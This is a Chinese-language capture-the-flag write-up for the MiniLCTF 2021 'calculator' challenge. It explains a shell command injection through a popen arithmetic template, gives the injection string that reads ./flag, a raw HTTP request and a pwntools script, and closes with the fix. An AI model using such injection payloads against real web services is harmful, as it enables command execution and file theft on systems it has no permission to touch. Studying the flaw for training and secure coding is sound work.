# MiniLCTF 2021 - calculator

## 题目简述

题目是一个 64 位 HTTP 计算器。二进制开启 Full RELRO、Canary、NX 与 PIE，但漏洞不在内存破坏：`/calc` 路由把查询参数 `x`、`y` 和运算类型拼进 shell 算术表达式，例如 `echo $((%s + %s))`，随后交给 `popen`。参数没有做 shell 转义，因而可以闭合 `$((...))` 并注入新命令。

## 解题过程

`strings` 可以直接看到四个命令模板：

```text
echo $((%s + %s))
echo $((%s - %s))
echo $((%s * %s))
echo $((%s / %s))
```

选择加法，把 `x` 构造为：

```text
`cat$IFS./flag`));echo$IFS$((1
```

其中反引号先执行 `cat ./flag`，`$IFS` 在不直接写空格的情况下充当参数分隔符；`));` 闭合原算术展开并开始下一条 `echo`，末尾的 `$((1` 再与模板中的 `+ y))` 配平。原始 HTTP 请求为：

```http
GET /calc?x=`cat$IFS./flag`));echo$IFS$((1&y=1&action=add HTTP/1.1
Host: target
Connection: close

```

用 pwntools 发送时必须保留请求行结尾：

```python
from pwn import remote

p = remote("127.0.0.1", 9999)
request = (
    b"GET /calc?x=`cat$IFS./flag`));echo$IFS$((1"
    b"&y=1&action=add HTTP/1.1\r\n"
    b"Host: target\r\n"
    b"Connection: close\r\n\r\n"
)
p.send(request)
print(p.recvall().decode(errors="replace"))
```

命令输出被 `popen` 读取并写入 HTTP 响应，因此可直接在响应正文中看到 flag。flag 文件由部署时生成，仓库没有固定值。

## 方法总结

保护机制只覆盖传统内存利用，不能阻止把不可信字符串交给 shell。只要程序用 `snprintf` 拼命令后调用 `popen`，就应逐字符分析引号、命令替换、算术展开和分隔符如何闭合。修复方式不是增加几个黑名单字符，而是完全取消 shell 拼接，在进程内完成整数解析与运算。
